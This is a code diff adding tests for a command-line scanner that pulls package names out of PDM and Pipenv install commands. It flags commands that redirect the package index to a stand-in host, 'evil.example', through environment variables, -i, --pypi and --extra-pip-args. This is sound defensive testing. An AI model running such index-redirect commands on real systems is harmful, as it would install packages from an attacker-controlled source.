@@ -332,3 +332,33 @@ describe('scanCommandLine refuses to guess for Python', () => {
     expect(scanCommandLine('PIP_INDEX_URL=https://pypi.org/simple pip install requests').unreadable).toBeUndefined();
   });
 });
+
+describe('scanCommandLine reads PDM and Pipenv', () => {
+  it.each([
+    ['pdm add requests', ['pdm:pypi:requests']],
+    ['pdm add -dG test pytest "httpx>=0.27"', ['pdm:pypi:pytest', 'pdm:pypi:httpx>=0.27']],
+    ['pdm add -e ./libs/local --no-sync idna', ['pdm:pypi:./libs/local', 'pdm:pypi:idna']],
+    ['pdm add --venv in-project requests', ['pdm:pypi:requests']],
+    ['pdm install', []],
+    ['pdm run pip install evil', ['pip:pypi:evil']],
+    ['pipenv install requests', ['pipenv:pypi:requests']],
+    ['pipenv install --dev "pytest>=8" -e mylib', ['pipenv:pypi:pytest>=8', 'pipenv:pypi:./mylib']],
+    ['pipenv install', []],
+    ['pipenv install -r requirements.txt', []],
+    ['pipenv run pip install evil', ['pip:pypi:evil']],
+  ])('%s', (line, expected) => {
+    expect(specs(line)).toEqual(expected);
+    expect(scanCommandLine(line).unreadable).toBeUndefined();
+  });
+
+  it.each([
+    ['PDM_PYPI_URL=https://evil.example/simple pdm add requests', 'PDM_PYPI_URL may point'],
+    ['pdm -c evil.toml add requests', '-c may point'],
+    ['pipenv install -i https://evil.example/simple requests', '-i may point'],
+    ['pipenv install --pypi https://evil.example/simple requests', '--pypi-mirror may point'],
+    ['PIPENV_PYPI_MIRROR=https://evil.example/simple pipenv install requests', 'PIPENV_PYPI_MIRROR may point'],
+    ['pipenv install --extra-pip-args="--extra-index-url https://evil.example" requests', '--extra-pip-args may point'],
+  ])('%s', (line, reason) => {
+    expect(scanCommandLine(line).unreadable).toContain(reason);
+  });
+});
